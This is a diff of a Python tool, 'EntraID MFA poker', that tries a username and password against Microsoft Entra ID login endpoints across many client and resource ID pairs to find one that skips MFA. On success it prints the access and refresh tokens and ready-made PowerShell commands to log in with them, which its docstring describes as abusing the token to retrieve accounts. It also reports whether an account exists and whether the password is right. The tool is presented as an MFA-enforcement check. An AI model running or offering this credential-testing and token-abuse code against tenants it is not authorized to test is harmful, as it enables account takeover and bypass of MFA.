@@ -14,12 +14,19 @@ r'''
         GNU General Public License for more details.
 
         You should have received a copy of the GNU General Public License
-        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+        along with this program. If not, see <http://www.gnu.org/licenses/>.
         
         File name EntraIDMFAPoker.py
         written by Tijl Deneut
 
+        This script attempts to authenticate in different ways to a Managed Entra ID tenant
+        without the use of any MFA parameters. 
+        --> This is also functional if the account requires MFA but has no methods registerd
+        -> Also included are some commands for abusing the received Access Token to authenticate
+            via PowerShell (AzureAD, AzAccount or MgGraph), all of them can be used to retrieve accounts
+
         Based on and shout out to RoadRecon: https://github.com/dirkjanm/ROADtools
+        -> roadrecon auth, roadrecon gather, roadrecon gui
 '''
 
 WELLKNOWN_RESOURCES = {
@@ -39,7 +46,7 @@ WELLKNOWN_CLIENTS = {  ## Or actually Application ID's, Full list: https://learn
     'teams': '1fec8e78-bce4-4aaf-ab1b-5451cc387264'     ## Microsoft Teams
 }
 
-import base64, json, time, argparse, getpass
+import base64, json, time, argparse, getpass, sys
 import requests ## python3 -m pip install requests
 
 sBaseURL = 'https://login.microsoftonline.com/common'
@@ -52,11 +59,11 @@ def tryEntraLogin(lstData, resource = None, client = None, boolVerbose = False):
     if oResponse.status_code != 200:
         sDescr = jResp['error_description']
         if 'multi-factor authentication' in sDescr: 
-            if boolVerbose: print(f'[-] Credentials are GOOD, but resource {lstData['resource']}, client {lstData['client_id']}, account {lstData['username']} require MFA')
+            if boolVerbose: print('[-] Credentials are GOOD, but resource {}, client {}, account {} require MFA'.format(lstData['resource'], lstData['client_id'], lstData['username']))
             return None
         print('[-] Login failed, please alter the parameters:')
-        if 'does not exist in' in sDescr: print(f'    Account {lstData['username']} does not exist.')
-        elif 'validating credentials due to invalid' in sDescr: print(f'    Account {lstData['username']} was found but the provided password is wrong.')
+        if 'does not exist in' in sDescr: print('    Account {} does not exist.'.format(lstData['username']))
+        elif 'validating credentials due to invalid' in sDescr: print('    Account {} was found but the provided password is wrong.'.format(lstData['username']))
         else: print(sDescr)
         exit()
     else: return jResp
@@ -84,13 +91,13 @@ def showData(jResp, boolShowTips):
     if sUnique and sUnique != sUPN: print(f'    Unique Name:    {sUnique}')
     if boolShowTips: 
         print(f'    Access Token:   {sAccessToken}')
-        print(f'    Refresh Token:  {jResp['refresh_token']}')
+        print('    Refresh Token:  {}'.format(jResp['refresh_token']))
 
     if sAccessToken and sOID and sUPN and sTenantID and boolShowTips: 
         print('\nPlease try running, in order of preference:\n')
-        print(f'Connect-AzureAD -TenantID {sTenantID} -AccountId {sOID} -AadAccessToken {sAccessToken} ## Requires Install-Module AzureAD')
+        print(f'Connect-AzureAD -TenantID {sTenantID} -AccountId {sOID} -AadAccessToken {sAccessToken} ## Requires Install-Module AzureAD, verify with "Get-AzureADTenantDetail | Format-List"')
         print('OR')
-        print(f'Connect-AzAccount -Tenant {sTenantID} -AccountId {sOID} -AccessToken {sAccessToken} ## Requires Install-Module AZ')
+        print(f'Connect-AzAccount -Tenant {sTenantID} -AccountId {sOID} -AccessToken {sAccessToken} ## Requires Install-Module AZ, verify with "Get-Azcontext | Format-List"')
         print('OR')
         print(f'$AccToken = \'{sAccessToken}\'; $SecureToken = $AccToken | ConvertTo-SecureString -AsPlainText -Force; Connect-MgGraph -AccessToken $SecureToken; Get-MgContext ## Requires Install-Module Microsoft.Graph')
     exit()
@@ -98,14 +105,15 @@ def showData(jResp, boolShowTips):
 def main():
     global WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
     ## Banner
-    print(r'''
+    sBanner = r'''
     [*****************************************************************************]
                               --- EntraID MFA poker ---
     This script verifies of MFA is enforced on all Entra ID resource & client types
           NOTE: There might be Rate Limiting/Auto Block of IP Addresses
     ______________________/-> Created By Tijl Deneut(c) <-\_______________________
     [*****************************************************************************]
-    ''')
+    '''
+    if len(sys.argv) < 2: print(sBanner)
     ## Defaults and parsing arguments
     parser = argparse.ArgumentParser()
     parser.add_argument('-u', '--username', help='Username, e.g. john.doe@contoso.com', default='', required=True)
@@ -123,7 +131,7 @@ def main():
     ## Standard attempt, AADPS on AADGRAPH
     jResp = tryEntraLogin(lstData, args.resource, args.client, args.verbose)
     if not jResp: ## Correct credentials, but MFA sits in the way
-        print(f'[!] Credentials are GOOD, but for this resource, account {args.username} requires MFA, trying other combinations now')
+        print('[!] Credentials are GOOD, but for this resource, account {} requires MFA, trying other combinations now'.format(args.username))
         if not args.full: WELLKNOWN_CLIENTS = {args.client: WELLKNOWN_CLIENTS[args.client]}
         iCount = 0
         for sRes in WELLKNOWN_RESOURCES:
@@ -131,7 +139,7 @@ def main():
                 iCount += 1
                 jResp = tryEntraLogin(lstData, sRes, sCli, args.verbose)
                 if jResp: 
-                    print(f'[+] Success for resource type {WELLKNOWN_RESOURCES[sRes]} and client type {sCli}')
+                    print('[+] Success for resource type {} and client type {}'.format(WELLKNOWN_RESOURCES[sRes], sCli))
                     showData(jResp, args.showtips)
                 print('    Trying next combo; {} out of {}'.format(iCount,len(WELLKNOWN_RESOURCES)*len(WELLKNOWN_CLIENTS)))
                 time.sleep(2)
